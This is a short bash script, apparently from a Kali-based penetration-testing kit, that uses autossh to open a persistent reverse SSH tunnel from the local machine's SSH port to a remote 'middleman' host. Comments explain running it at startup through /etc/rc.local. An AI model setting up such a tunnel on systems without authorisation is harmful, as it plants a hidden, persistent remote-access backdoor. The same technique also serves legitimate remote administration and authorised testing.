#!/bin/bash

if test "$#" -ne 1; then
    echo "Must supply 1 argument - Middleman IP address"
fi

autossh -M 10984 -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/nopwd -R 6666:localhost:22 kali_rvs@$1 

#to make this run on startup, add the following to /etc/rc.local and make sure Certificates are in configured
/opt/kali_plus/801_ReverseSSH.sh [Remote Listener IP]

#reference - https://raymii.org/s/tutorials/Autossh_persistent_tunnels.html
